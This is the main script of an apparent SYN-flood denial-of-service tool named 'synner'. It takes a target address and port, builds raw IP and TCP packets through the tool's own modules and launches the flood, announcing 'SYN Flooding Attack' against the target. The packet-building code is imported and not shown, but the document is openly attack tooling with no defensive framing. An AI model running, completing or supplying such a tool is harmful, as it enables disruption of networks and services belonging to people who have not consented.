from config.colors import COLORS

from synner.banner.banner import init
from synner.argparser.parser import parser


from synner.utils.network.ip import ip
from synner.utils.network.tcp import tcp

from synner.utils.packet.raw import raw
from synner.utils.packet.packet import packet


def main():
    args = parser()

    init()

    ip_ = ip(
        args.target
    )

    tcp_ = tcp(
        int(args.port)
    )

    raw_ = raw()


    print(
        f"{COLORS['RESET']}[+] {COLORS['INFO']} SYN Flooding Attack : {COLORS['DATA']}{args.target} {COLORS['RESET']}| {COLORS['DATA']}{args.port}"
    )

    packet(
        raw_,
        tcp_,
        ip_
    )


if __name__ == '__main__':
    main()
